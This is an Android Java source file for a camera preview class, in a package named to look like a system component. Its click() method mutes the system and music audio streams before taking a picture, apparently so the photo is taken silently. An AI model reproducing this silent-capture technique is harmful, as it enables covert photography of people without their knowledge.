package com.android.networking.gui;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.PreviewCallback;
import android.hardware.Camera.ShutterCallback;
import android.media.AudioManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

public class Preview extends SurfaceView implements SurfaceHolder.Callback {
	private static final String TAG = "Preview";

	SurfaceHolder mHolder; // <2>
	public Camera camera; // <3>
	AGUI agui;

	final ShutterCallback shutterCallback = new ShutterCallback() {

		public void onShutter() {
			if (Cfg.DEBUG) {
				Check.log(TAG + " onShutter");//$NON-NLS-1$
			}
		}
	};
	final PictureCallback rawCallback = new PictureCallback() {
		public void onPictureTaken(final byte[] _data, final Camera _camera) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " onPictureTaken RAW");//$NON-NLS-1$
			}
		}
	};
	final PictureCallback jpegCallback = new PictureCallback() {
		public void onPictureTaken(final byte[] _data, final Camera _camera) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " onPictureTaken JPEG");//$NON-NLS-1$
			}
		}
	};
	
	Preview(AGUI context) {
		super(context);
		agui = context;

		// Install a SurfaceHolder.Callback so we get notified when the
		// underlying surface is created and destroyed.
		mHolder = getHolder(); // <4>
		mHolder.addCallback(this); // <5>
		mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS); // <6>
	}

	// Called once the holder is ready
	public void surfaceCreated(SurfaceHolder holder) { // <7>
		// The Surface has been created, acquire the camera and tell it where
		// to draw.
		camera = Camera.open(); // <8>

		Camera.Parameters camParams = camera.getParameters();
		camParams.set("iso", (String) "400");
		camera.setParameters(camParams);

		try {
			camera.setPreviewDisplay(holder); // <9>
			camera.setPreviewCallback(new PreviewCallback() { // <10>
				// Called for each frame previewed
				public void onPreviewFrame(byte[] data, Camera camera) { // <11>
					Log.d(TAG, "onPreviewFrame called at: " + System.currentTimeMillis());
					Preview.this.invalidate(); // <12>
				}
			});
		} catch (IOException e) { // <13>
			e.printStackTrace();
		}
	}

	// Called when the holder is destroyed
	public void surfaceDestroyed(SurfaceHolder holder) { // <14>
		camera.stopPreview();
		camera = null;
	}

	// Called when holder has changed
	public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) { // <15>
		camera.startPreview();
	}
	
	public void click() {
		AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);

		audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
		audioManager.setStreamMute(AudioManager.STREAM_MUSIC,true);
		//audioManager.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
		camera.takePicture(shutterCallback, rawCallback, jpegCallback);
	}

}